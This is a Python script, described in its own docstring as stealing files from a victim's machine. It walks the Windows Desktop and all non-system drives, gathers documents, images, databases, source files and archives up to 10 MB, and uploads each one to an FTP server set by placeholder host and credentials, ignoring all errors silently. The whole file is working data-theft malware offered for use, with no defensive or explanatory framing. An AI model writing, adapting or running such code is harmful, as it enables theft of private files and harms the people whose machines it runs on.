"""
Steal Files on Victims Machine and send to FTP Server
"""

import sys
import os
import ftplib
from threading import Thread
from time import sleep
import string
import random
import win32api


def get_all_drivers():
    try:
        if sys.platform in ("win32", "cygwin"):
            drives = win32api.GetLogicalDriveStrings()
            drives = drives.split("\000")[:-1]
            win_drive = os.environ["SYSTEMDRIVE"]

            # Remove SystemDrive
            for key, value in enumerate(drives):
                if win_drive in value:
                    del drives[key]

        return drives
    except Exception:
        sys.exit()


def discover_files(startpath):
    extensions = [
        "jpg",
        "jpeg",
        "bmp",
        "gif",
        "png",
        "svg",
        "psd",
        "raw",
        "avi",
        "flv",
        "m4v",
        "mkv",
        "mov",
        "mpg",
        "mpeg",
        "wmv",
        "swf",
        "3gp",
        "doc",
        "docx",
        "xls",
        "xlsx",
        "ppt",
        "pptx",
        "odt",
        "odp",
        "ods",
        "txt",
        "rtf",
        "tex",
        "pdf",
        "epub",
        "md",
        "csv",
        "db",
        "sql",
        "dbf",
        "mdb",
        "go",
        "py",
        "pyc",
        "zip",
        "tar",
        "tgz",
        "bz2",
        "7z",
        "rar",
        "bak",
    ]

    for dirpath, dirs, files in os.walk(startpath):
        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            ext = absolute_path.split(".")[-1]
            if ext in extensions:
                # Only get Files that are not bigger than 10MB
                if os.stat(absolute_path).st_size <= 10485760:
                    yield absolute_path


def upload_file(file):
    sleep(1)
    output_string = "".join(
        random.SystemRandom().choice(string.ascii_letters + string.digits)
        for _ in range(3))
    try:
        with open(file, "rb") as filedata:
            with ftplib.FTP("FTPSERVER", "USERNAME", "PASSWORD") as ftp_connection:
                # Change Directory in FTP Server
                #ftp_connection.cwd("files")
                if file.split("\\")[-1] not in ftp_connection.nlst():
                    ftp_connection.storbinary("STOR " + file.split("\\")[-1], filedata)
                else:
                    ftp_connection.storbinary(
                        "STOR " + output_string + file.split("\\")[-1], filedata)
    except Exception:
        pass


def get_desktop_path():
    try:
        if sys.platform in ("win32", "cygwin"):
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")

        return desktop
    except Exception:
        sys.exit()


def main():
    # Specify custom Path => Desktop
    for file in discover_files(get_desktop_path()):
        desktop_thread = Thread(target=upload_file(file), args=(file,))
        desktop_thread.start()

    # Get all Drivers except SystemDrive
    for drive in get_all_drivers():
        for file in discover_files(drive):
            driver_thread = Thread(target=upload_file(file), args=(file,))
            driver_thread.start()

if __name__ == "__main__":
    main()
